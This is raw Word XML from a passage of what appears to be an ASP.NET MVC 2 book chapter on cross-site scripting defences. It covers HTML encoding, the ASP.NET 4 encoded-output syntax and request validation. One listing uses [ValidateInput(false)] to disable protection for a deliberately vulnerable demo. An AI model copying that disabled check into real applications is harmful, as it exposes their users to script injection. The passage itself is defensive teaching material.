    <w:p w:rsidR="00EA7892" w:rsidRDefault="00EA7892" w:rsidP="006D447A">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:b/>
          <w:smallCaps/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>One vulnerability with our example application is that it rendered the submitted script as scrip</w:t>
      </w:r>
      <w:r w:rsidR="006D447A">
        <w:t>t to be executed by the browser (figure 11.2). Instead, we should have HTML encode</w:t>
      </w:r>
      <w:ins w:id="199" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="00B74B32">
        <w:rPr>
          <w:rPrChange w:id="200" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>HTML encode</w:instrText>
      </w:r>
      <w:ins w:id="201" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="006D447A">
        <w:t xml:space="preserve">d the comment.  HTML encoding transforms text from HTML that is interpreted by the browser into symbols that the browser will render without interpretation. Instead of our script being parsed and executed, it would have simply been displayed as text.  In our view we rendered the comment with this markup: </w:t>
      </w:r>
      <w:r w:rsidR="006D447A" w:rsidRPr="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinTable"/>
        </w:rPr>
        <w:t>&lt;%= Model.Comment %&gt;</w:t>
      </w:r>
      <w:r w:rsidR="006D447A" w:rsidRPr="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">, but </w:t>
      </w:r>
      <w:r w:rsidR="006D447A" w:rsidRPr="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">we </w:t>
      </w:r>
      <w:r w:rsidR="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="006D447A" w:rsidRPr="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">ould have applied </w:t>
      </w:r>
      <w:r w:rsidR="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="006D447A" w:rsidRPr="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> built-in function that encodes HTML:</w:t>
      </w:r>
      <w:r w:rsidR="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:commentRangeStart w:id="202"/>
      <w:commentRangeStart w:id="203"/>
      <w:r w:rsidR="006D447A" w:rsidRPr="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;%= </w:t>
      </w:r>
      <w:r w:rsidR="00DE1364">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>Html</w:t>
      </w:r>
      <w:r w:rsidR="006D447A" w:rsidRPr="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00DE1364">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>Encode</w:t>
      </w:r>
      <w:ins w:id="204" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="008E0B82">
        <w:rPr>
          <w:rPrChange w:id="205" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Html.Encode</w:instrText>
      </w:r>
      <w:ins w:id="206" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="006D447A" w:rsidRPr="006D447A">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>(Model.Comment) %&gt;</w:t>
      </w:r>
      <w:commentRangeEnd w:id="202"/>
      <w:r w:rsidR="00DE1364">
        <w:commentReference w:id="202"/>
      </w:r>
      <w:commentRangeEnd w:id="203"/>
      <w:r w:rsidR="00321631">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="203"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D447A" w:rsidRDefault="006D447A" w:rsidP="006D447A">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 11.4 shows how a harmless HTML encoded script would appear:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D447A" w:rsidRDefault="006D447A" w:rsidP="006D447A">
      <w:r w:rsidRPr="006D447A">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4800600" cy="394888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800600" cy="3948881"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D447A" w:rsidRDefault="006D447A" w:rsidP="006D447A">
      <w:pPr>
        <w:pStyle w:val="FigureCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 11.4 Our script rendered harmlessly</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F85326" w:rsidRDefault="00F85326" w:rsidP="00F85326">
      <w:pPr>
        <w:pStyle w:val="SidebarHead"/>
      </w:pPr>
      <w:r>
        <w:t>Html Encoding Code Blocks in ASP.NET 4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRDefault="00F85326" w:rsidP="00F85326">
      <w:pPr>
        <w:pStyle w:val="Sidebar"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There's a new feature in ASP.NET 4 that allows developers to conveniently express HTML encoded output without using the </w:t>
      </w:r>
      <w:r w:rsidR="00DE1364">
        <w:t>Html</w:t>
      </w:r>
      <w:r>
        <w:t>.Encode</w:t>
      </w:r>
      <w:ins w:id="207" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="008E0B82">
        <w:rPr>
          <w:rPrChange w:id="208" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Html.Encode</w:instrText>
      </w:r>
      <w:ins w:id="209" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> helper function.  Instead of specifying output with </w:t>
      </w:r>
      <w:r w:rsidRPr="00F85326">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>&lt;%= "text" %&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> use </w:t>
      </w:r>
      <w:r w:rsidRPr="00F85326">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>&lt;%: "text" %&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  For more information, refer to Phil Haack's blog post: </w:t>
      </w:r>
      <w:commentRangeStart w:id="210"/>
      <w:commentRangeStart w:id="211"/>
      <w:r w:rsidR="00705E20">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00905706">
        <w:instrText>HYPERLINK "http://haacked.com/archive/2009/09/25/html-encoding-code-nuggets.aspx"</w:instrText>
      </w:r>
      <w:r w:rsidR="00705E20">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00F85326">
        <w:t>http://haacked.com/archive/2009/09/25/html-encoding-code-nuggets.aspx</w:t>
      </w:r>
      <w:r w:rsidR="00705E20">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:commentRangeEnd w:id="210"/>
      <w:r w:rsidR="00A96356">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:vanish/>
        </w:rPr>
        <w:commentReference w:id="210"/>
      </w:r>
      <w:commentRangeEnd w:id="211"/>
      <w:r w:rsidR="009922FB">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:commentReference w:id="211"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRDefault="006C7FA8" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">While HTML encoding all output makes our application much more secure, </w:t>
      </w:r>
      <w:r w:rsidRPr="006C7FA8">
        <w:t>Hackers</w:t>
      </w:r>
      <w:ins w:id="212" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="005619DF">
        <w:rPr>
          <w:rPrChange w:id="213" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Hackers</w:instrText>
      </w:r>
      <w:ins w:id="214" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="006C7FA8">
        <w:t xml:space="preserve"> are crafty, and constantly discovering new ways to evade encoding</w:t>
      </w:r>
      <w:r>
        <w:t>. It's important to also check input to our application.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EA7892" w:rsidRDefault="00EA7892" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>ASP.NET MVC Defaults</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="006C7FA8" w:rsidP="00665DBB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b w:val="0"/>
          <w:smallCaps/>
          <w:color w:val="960000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C7FA8">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>In order to even craft the vulnerable</w:t>
      </w:r>
      <w:ins w:id="215" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="Bold"/>
            <w:b w:val="0"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="216" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="217" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="Bold"/>
            <w:b w:val="0"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="006C7FA8">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> example, we had t</w:t>
      </w:r>
      <w:r w:rsidRPr="00665DBB">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">o disable protective features in ASP.NET MVC 2. Listing 11.8 demonstrates </w:t>
      </w:r>
      <w:r w:rsidR="00665DBB" w:rsidRPr="00665DBB">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>how input validation</w:t>
      </w:r>
      <w:ins w:id="218" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="Bold"/>
            <w:b w:val="0"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00E00443">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:b w:val="0"/>
          <w:rPrChange w:id="219" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
            <w:rPr>
              <w:rStyle w:val="Bold"/>
              <w:b w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>input validation</w:instrText>
      </w:r>
      <w:ins w:id="220" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="Bold"/>
            <w:b w:val="0"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00665DBB" w:rsidRPr="00665DBB">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> was specifically disabled</w:t>
      </w:r>
      <w:r w:rsidRPr="00665DBB">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRDefault="006C7FA8" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.8 [ValidateInput(false)]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRPr="006C7FA8" w:rsidRDefault="006C7FA8" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="006C7FA8">
        <w:t>[ValidateInput(false)]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                       #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRPr="006C7FA8" w:rsidRDefault="006C7FA8" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="006C7FA8">
        <w:t>public ViewResult Save(CommentInput form)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRPr="006C7FA8" w:rsidRDefault="006C7FA8" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="006C7FA8">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRPr="006C7FA8" w:rsidRDefault="006C7FA8" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="006C7FA8">
        <w:tab/>
        <w:t>return View(form);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRDefault="006C7FA8" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="006C7FA8">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7FA8" w:rsidRDefault="006C7FA8" w:rsidP="006C7FA8">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 ValidateInput attribute disabling protection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00665DBB" w:rsidRDefault="00665DBB" w:rsidP="00665DBB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>The attribute signals ASP.NET to not validate user input to this action.  Without this attribute, by default, validation will happen, checking the query string, form and cookies for a set list of malicious</w:t>
      </w:r>
      <w:ins w:id="221" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="006872B1">
        <w:rPr>
          <w:rPrChange w:id="222" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>malicious</w:instrText>
      </w:r>
      <w:ins w:id="223" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> content.  Without this attribute directing ASP.NET to not validate, users submitting unsafe input will see the exception in figure 11.5.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00665DBB" w:rsidRDefault="00665DBB" w:rsidP="00665DBB">
      <w:r w:rsidRPr="00665DBB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4800600" cy="3948881"/>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800600" cy="3948881"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00665DBB" w:rsidRDefault="00665DBB" w:rsidP="00665DBB">
      <w:pPr>
        <w:pStyle w:val="FigureCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 11.5 Protected from dangerous input by ASP.NET</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00665DBB" w:rsidRDefault="00665DBB" w:rsidP="00665DBB">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Input validation</w:t>
      </w:r>
      <w:ins w:id="224" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00CC3F44">
        <w:rPr>
          <w:rPrChange w:id="225" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Input validation</w:instrText>
      </w:r>
      <w:ins w:id="226" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> can prevent safe input if the application is expecting HTML or other markup. It should be disabled with extreme caution, and you should redouble your efforts to HTML encode</w:t>
      </w:r>
      <w:ins w:id="227" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="00B74B32">
        <w:rPr>
          <w:rPrChange w:id="228" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>HTML encode</w:instrText>
      </w:r>
      <w:ins w:id="229" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> all output.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00665DBB" w:rsidRDefault="00665DBB" w:rsidP="00665DBB">
      <w:pPr>
        <w:pStyle w:val="SidebarHead"/>
      </w:pPr>
      <w:r>
        <w:t>Smarter, safer browsers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00665DBB" w:rsidRDefault="00665DBB" w:rsidP="00665DBB">
      <w:pPr>
        <w:pStyle w:val="Sidebar"/>
      </w:pPr>
      <w:r>
        <w:t>Chrome 4</w:t>
      </w:r>
      <w:ins w:id="230" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00B36A14">
        <w:rPr>
          <w:rPrChange w:id="231" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Chrome 4</w:instrText>
      </w:r>
      <w:ins w:id="232" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> and the Firefox</w:t>
      </w:r>
      <w:ins w:id="233" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00205749">
        <w:rPr>
          <w:rPrChange w:id="234" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Firefox</w:instrText>
      </w:r>
      <w:ins w:id="235" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> extension NoScript</w:t>
      </w:r>
      <w:ins w:id="236" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00587595">
        <w:rPr>
          <w:rPrChange w:id="237" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>NoScript</w:instrText>
      </w:r>
      <w:ins w:id="238" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> provide input validation</w:t>
      </w:r>
      <w:ins w:id="239" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00E00443">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
          <w:b w:val="0"/>
          <w:rPrChange w:id="240" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
            <w:rPr>
              <w:rStyle w:val="Bold"/>
              <w:b w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>input validation</w:instrText>
      </w:r>
      <w:ins w:id="241" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> on the client.  They refuse to render any script that was present in the previous request.  While these measures are not fail-safe, they are useful tools users can employ to protect themselves against becoming victimized by certain web application vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="007305C4">
        <w:instrText>vulnerabilities</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like XSS</w:t>
      </w:r>
      <w:ins w:id="242" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="243" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="244" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
